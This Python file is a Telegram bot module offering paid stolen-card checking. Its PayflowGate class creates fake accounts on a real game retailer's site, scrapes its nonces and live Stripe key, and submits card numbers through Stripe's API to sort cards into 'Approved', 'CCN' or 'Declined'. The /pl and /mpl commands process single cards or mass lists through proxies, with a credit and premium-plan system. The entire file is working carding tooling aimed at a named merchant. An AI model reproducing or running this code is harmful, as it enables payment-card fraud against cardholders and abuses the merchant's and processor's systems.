import re
import json
import requests
import asyncio
from time import time
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType
import random
import string
from BOT.tools.proxy import get_proxy

user_locks = {}


class PayflowGate:
    """Payflow Stripe Auth Gate using legacygames.com - Real Checking (Original API)"""
    
    def __init__(self, proxy=None):
        self.s = requests.Session()
        self.proxy = proxy
        
        # Headers from original API
        self.headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        }
        self.s.headers.update(self.headers)
        
        # Apply proxy if provided
        if proxy:
            self.s.proxies = {'http': proxy, 'https': proxy}
    
    def rnd_str(self, l=10):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=l))
    
    def check_card(self, cc, mm, yy, cvv):
        """Full Payflow Auth check - Original API from legacygames.com"""
        try:
            # Format month - exact as original
            if int(mm) < 10 and '0' not in mm:
                mm = f'0{mm}'
            
            # Format year - exact as original
            if len(yy) == 2:
                yy = f'20{yy}'
            
            # Step 1: Get registration page - exact as original
            html_response = self.s.get('https://legacygames.com/my-account/add-payment-method/', timeout=30)
            
            reg_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', html_response.text)
            if not reg_match:
                return "Declined ❌", "Nonce Error"
            reg = reg_match.group(1)
            
            pk_live_match = re.search(r'pk_live_[a-zA-Z0-9]+', html_response.text)
            if not pk_live_match:
                return "Declined ❌", "PK Error"
            pk_live = pk_live_match.group(0)
            
            # Step 2: Register user - exact as original
            start_num = random.randint(1, 9999)
            user = f"user{random.randint(1000, 9999)}{start_num}"
            email = f"{user}@gmail.com"
            
            data = {
                'username': user,
                'email': email,
                'password': 'qeqweqweqwqw12312@',
                'promo_referral_name': '',
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': 'https://legacygames.com/',
                'wc_order_attribution_session_start_time': '2025-10-16 11:55:34',
                'wc_order_attribution_session_pages': '17',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': self.headers['user-agent'],
                'woocommerce-register-nonce': reg,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }
            
            self.s.post('https://legacygames.com/my-account/', data=data, timeout=30)
            
            # Step 3: Get add payment nonce - exact as original
            html2 = self.s.get('https://legacygames.com/my-account/add-payment-method/', timeout=30).text
            
            addnonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html2)
            if not addnonce_match:
                return "Declined ❌", "Nonce Error"
            addnonce = addnonce_match.group(1)
            
            # Step 4: Create Stripe payment method - exact data format as original (NO PROXY)
            data_stripe = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=TR&payment_user_agent=stripe.js%2F3eb96675be%3B+stripe-js-v3%2F3eb96675be%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Flegacygames.com&time_on_page=13706&client_attribution_metadata[client_session_id]=758e76a9-5fda-4c8f-ab58-3d338b594899&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=49ba8458-1fd3-4bde-b85d-30d98c7cef9a&guid=aa7c8346-057c-4871-b817-d2082e3842d790f3af&muid=915ccdf6-9a1e-4b46-b7bf-84213dd8f2e84af545&sid=a2210aa1-6aaf-4e1d-b733-a78f5af25f8605fd5c&key={pk_live}'
            
            # Stripe API call without proxy
            stripe_session = requests.Session()
            response_stripe = stripe_session.post('https://api.stripe.com/v1/payment_methods', headers=self.headers, data=data_stripe, timeout=30)
            
            try:
                pm = response_stripe.json()['id']
            except (KeyError, ValueError):
                error_msg = response_stripe.json().get('error', {}).get('message', 'Stripe Error')
                return "Declined ❌", error_msg[:40]
            
            # Step 5: Confirm setup intent - exact as original
            data_setup_intent = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': addnonce,
            }
            
            response_final = self.s.post('https://legacygames.com/wp-admin/admin-ajax.php', data=data_setup_intent, timeout=30)
            res = response_final.text
            
            # Parse response - exact logic as original
            if '"success":true' in res or '"success":True' in res:
                return "Approved ✅", "Card Approved"
            elif 'succeded' in res:
                return "Approved ✅", "Card Approved"
            elif '"success":false' in res or '"success":False' in res:
                if "Your card's expiration year is invalid." in res:
                    return "Declined ❌", "Expired Card"
                elif "Your card's expiration month is invalid." in res:
                    return "Declined ❌", "Expired Card"
                elif 'Your card number is incorrect.' in res:
                    return "Declined ❌", "Incorrect Number"
                elif "Your card's security code is incorrect." in res:
                    return "CCN ✅", "Incorrect CVC"
                elif 'Your card was declined.' in res:
                    return "Declined ❌", "Card Declined"
                elif 'insufficient funds' in res.lower():
                    return "Approved ✅", "Insufficient Funds"
                elif 'do not honor' in res.lower():
                    return "Approved ✅", "Do Not Honor"
                else:
                    # Extract error message
                    try:
                        resp_json = response_final.json()
                        msg = resp_json.get('data', {}).get('error', {}).get('message', 'Declined')
                        return "Declined ❌", msg[:40]
                    except:
                        return "Declined ❌", "Unknown Error"
            else:
                return "Declined ❌", "Unknown Response"
                
        except requests.exceptions.Timeout:
            return "Declined ❌", "Timeout"
        except requests.exceptions.ProxyError:
            return "Declined ❌", "Proxy Error"
        except Exception as e:
            return "Declined ❌", str(e)[:40]


def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_allowed_groups():
    try:
        with open("DATA/groups.json", "r") as f:
            return json.load(f)
    except:
        return []

def has_credits(user_id):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user.get("plan", {}).get("credits", 0)
        if credits == "∞":
            return True
        return int(credits) > 0
    except:
        return False

def deduct_credit(user_id):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user["plan"].get("credits", 0)
        if credits == "∞":
            return True
        if int(credits) > 0:
            user["plan"]["credits"] = str(int(credits) - 1)
            users[str(user_id)] = user
            with open("DATA/users.json", "w") as f:
                json.dump(users, f, indent=4)
            return True
        return False
    except:
        return False

def deduct_credit_bulk(user_id, amount):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user["plan"].get("credits", 0)
        if credits == "∞":
            return True
        credits = int(credits)
        if credits >= amount:
            user["plan"]["credits"] = str(credits - amount)
            users[str(user_id)] = user
            with open("DATA/users.json", "w") as f:
                json.dump(users, f, indent=4)
            return True
        return False
    except:
        return False

def extract_card(text):
    match = re.search(r'(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', text)
    if match:
        return match.groups()
    return None

def extract_cards(text):
    return re.findall(r'(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', text)

def check_payflow(cc, mm, yy, cvv, proxy=None):
    """Full Payflow check"""
    gate = PayflowGate(proxy=proxy)
    return gate.check_card(cc, mm, yy, cvv)

def is_free_user(user_id):
    try:
        users = load_users()
        user = users.get(str(user_id))
        if not user:
            return True
        plan = user.get("plan", {}).get("plan", "Free")
        return plan in ["Free", "Redeem Code"]
    except:
        return True


@Client.on_message(filters.command("pl") & ~filters.edited)
async def payflow_single(client, message):
    """Single card Payflow Auth checker"""
    try:
        allowed_groups = load_allowed_groups()
        user_id = str(message.from_user.id)
        
        if message.chat.type == ChatType.PRIVATE:
            if is_free_user(user_id):
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
                    "<b>~ Get Premium to use in private</b>\n"
                    "━━━━━━━━━━━━━\n"
                    "<b>Type <code>/buy</code> to get Premium.</b>",
                    reply_to_message_id=message.id
                )
        elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.chat.id not in allowed_groups:
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>This Group Is Not Approved ⚠️</code>",
                )
        
        users = load_users()
        
        if user_id not in users:
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first using</b> <code>/register</code>",
                reply_to_message_id=message.id
            )
        
        if not has_credits(user_id):
            return await message.reply(
                "<pre>Insufficient Credits ❗️</pre>\n<b>Type /buy to get Credits.</b>",
                reply_to_message_id=message.id
            )
        
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            return await message.reply(
                "<pre>CC Not Found ❌</pre>\n<b>Usage:</b> <code>/pl cc|mm|yy|cvv</code>",
                reply_to_message_id=message.id
            )
        
        extracted = extract_card(target_text)
        if not extracted:
            return await message.reply(
                "<pre>Invalid Format ❌</pre>\n<b>Usage:</b> <code>/pl cc|mm|yy|cvv</code>",
                reply_to_message_id=message.id
            )
        
        cc, mm, yy, cvv = extracted
        fullcc = f"{cc}|{mm}|{yy}|{cvv}"
        
        proxy = get_proxy(message.from_user.id)
        
        start_time = time()
        
        loading_msg = await message.reply(
            f"<pre>✦ [$pl] | Processing..!</pre>\n━━━━━━━━━━━━\n• <b>Card -</b> <code>{fullcc}</code>\n• <b>Gate -</b> <code>Payflow Auth</code>",
            reply_to_message_id=message.id
        )
        
        loop = asyncio.get_event_loop()
        status, response = await loop.run_in_executor(None, check_payflow, cc, mm, yy, cvv, proxy)
        
        end_time = time()
        timetaken = round(end_time - start_time, 2)
        
        user_data = users.get(user_id, {})
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎟️")
        
        # Clickable username
        profile = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
        
        final_msg = f"""<b>[#Payflow] | Sos</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{fullcc}</code>
<b>[•] Gateway -</b> <code>Payflow Auth</code>
<b>[•] Status-</b> <code>{status}</code>
<b>[•] Response-</b> <code>{response}</code>
━━━━━━━━━━━━━━━
<b>[ﾒ] Checked By:</b> {profile} [<code>{plan} {badge}</code>]
<b>[ﾒ] T/t:</b> <code>[{timetaken} 𝐬]</code>"""
        
        buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Support", url="https://t.me/gitsus"),
                InlineKeyboardButton("Owner", url="https://t.me/gitsus")
            ]
        ])
        
        await loading_msg.edit(final_msg, reply_markup=buttons, disable_web_page_preview=True)
        
        deduct_credit(user_id)
    
    except Exception as e:
        await message.reply(f"<code>Error: {str(e)[:50]}</code>", reply_to_message_id=message.id)


@Client.on_message(filters.command("mpl") & ~filters.edited)
async def payflow_mass(client, message):
    """Mass Payflow Auth checker"""
    user_id = str(message.from_user.id)
    
    if not message.from_user:
        return await message.reply("❌ Cannot process this message.")
    
    if user_id in user_locks:
        return await message.reply(
            "<pre>⚠️ Wait!</pre>\n<b>Your previous /mpl is still processing.</b>",
            reply_to_message_id=message.id
        )
    
    user_locks[user_id] = True
    
    try:
        users = load_users()
        allowed_groups = load_allowed_groups()
        
        if message.chat.type == ChatType.PRIVATE:
            if is_free_user(user_id):
                user_locks.pop(user_id, None)
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
                    "<b>~ Get Premium to use in private</b>\n"
                    "━━━━━━━━━━━━━\n"
                    "<b>Type <code>/buy</code> to get Premium.</b>",
                    reply_to_message_id=message.id
                )
        elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.chat.id not in allowed_groups:
                user_locks.pop(user_id, None)
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n<b>This Group Is Not Approved ⚠️</b>",
                    reply_to_message_id=message.id
                )
        
        if user_id not in users:
            user_locks.pop(user_id, None)
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first using</b> <code>/register</code>",
                reply_to_message_id=message.id
            )
        
        user_data = users[user_id]
        plan_info = user_data.get("plan", {})
        plan = plan_info.get("plan", "Free")
        badge = plan_info.get("badge", "🎟️")
        
        # Card limits based on plan - Ultimate: 100, VIP: 50
        if plan.upper() == "ULTIMATE":
            mlimit = 100
        elif plan.upper() == "VIP":
            mlimit = 50
        else:
            mlimit = plan_info.get("mlimit", 10)
        
        if mlimit is None or str(mlimit).lower() in ["null", "none"]:
            mlimit = 10000
        else:
            mlimit = int(mlimit)
        
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            user_locks.pop(user_id, None)
            return await message.reply(
                "❌ Send cards!\nFormat: <code>4111111111111111|12|25|123</code>",
                reply_to_message_id=message.id
            )
        
        all_cards = extract_cards(target_text)
        if not all_cards:
            user_locks.pop(user_id, None)
            return await message.reply("❌ No valid cards found!", reply_to_message_id=message.id)
        
        if len(all_cards) > mlimit:
            all_cards = all_cards[:mlimit]
        
        available_credits = user_data.get("plan", {}).get("credits", 0)
        card_count = len(all_cards)
        
        if available_credits != "∞":
            try:
                if card_count > int(available_credits):
                    user_locks.pop(user_id, None)
                    return await message.reply(
                        "<pre>Insufficient Credits ❗️</pre>\n<b>Type /buy to get Credits.</b>",
                        reply_to_message_id=message.id
                    )
            except:
                pass
        
        # Clickable username
        checked_by = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a> [<code>{plan} {badge}</code>]"
        
        proxy = get_proxy(message.from_user.id)
        
        loader_msg = await message.reply(
            f"<pre>✦ [$mpl] | M-Payflow</pre>\n"
            f"<b>[⚬] Gateway:</b> <b>Payflow Auth</b>\n"
            f"<b>[⚬] Cards:</b> <code>{card_count}</code>\n"
            f"<b>[⚬] Status:</b> <code>Processing...</code>",
            reply_to_message_id=message.id
        )
        
        start_time = time()
        final_results = []
        loop = asyncio.get_event_loop()
        
        for card in all_cards:
            parts = card.split("|")
            if len(parts) == 4:
                cc, mm, yy, cvv = parts
                status, response = await loop.run_in_executor(None, check_payflow, cc, mm, yy, cvv, proxy)
                
                final_results.append(
                    f"[•] <b>Card:</b> <code>{card}</code>\n"
                    f"[•] <b>Status:</b> <code>{status}</code>\n"
                    f"[•] <b>Response:</b> <code>{response}</code>\n"
                    "━━━━━━━━━━━━"
                )
                
                # Show all results, cap at 20 during progress
                try:
                    display_results = final_results if len(final_results) <= 20 else final_results[-20:]
                    await loader_msg.edit(
                        f"<pre>✦ [$mpl] | M-Payflow</pre>\n"
                        + "\n".join(display_results) + "\n"
                        f"<b>[⚬] Progress:</b> <code>{len(final_results)}/{card_count}</code>\n"
                        f"<b>[⚬] Checked By:</b> {checked_by}",
                        disable_web_page_preview=True
                    )
                except:
                    pass
        
        end_time = time()
        timetaken = round(end_time - start_time, 2)
        
        if available_credits != "∞":
            deduct_credit_bulk(user_id, card_count)
        
        # Show ALL results
        final_text = f"<pre>✦ [$mpl] | M-Payflow</pre>\n"
        final_text += "\n".join(final_results) + "\n"
        final_text += f"<b>[ﾒ] T/t:</b> <code>[{timetaken} 𝐬]</code>\n"
        final_text += f"<b>[ﾒ] Total:</b> <code>{card_count} cards</code>\n"
        final_text += f"<b>[ﾒ] Checked By:</b> {checked_by}"
        
        buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Support", url="https://t.me/gitsus"),
                InlineKeyboardButton("Owner", url="https://t.me/gitsus")
            ]
        ])
        
        if len(final_text) > 4000:
            import os
            os.makedirs("downloads", exist_ok=True)
            filename = f"downloads/mpl_results_{user_id}.txt"
            
            with open(filename, "w") as f:
                f.write("Mass Payflow Results\n")
                f.write("=" * 50 + "\n\n")
                for result in final_results:
                    clean_result = result.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "")
                    f.write(clean_result + "\n")
                f.write("\n" + "=" * 50 + "\n")
                f.write(f"Time taken: {timetaken}s\n")
                f.write(f"Total cards: {card_count}\n")
            
            await message.reply_document(
                filename,
                caption=f"<pre>✦ [$mpl] | M-Payflow Results</pre>\n"
                        f"<b>[⚬] Total:</b> <code>{card_count} cards</code>\n"
                        f"<b>[⚬] T/t:</b> <code>{timetaken}s</code>\n"
                        f"<b>[⚬] Checked By:</b> {checked_by}",
                reply_to_message_id=message.id,
                reply_markup=buttons
            )
            await loader_msg.delete()
            os.remove(filename)
        else:
            await loader_msg.edit(
                final_text,
                disable_web_page_preview=True,
                reply_markup=buttons
            )
    
    except Exception as e:
        await message.reply(f"⚠️ Error: {str(e)[:50]}", reply_to_message_id=message.id)
    
    finally:
        user_locks.pop(user_id, None)
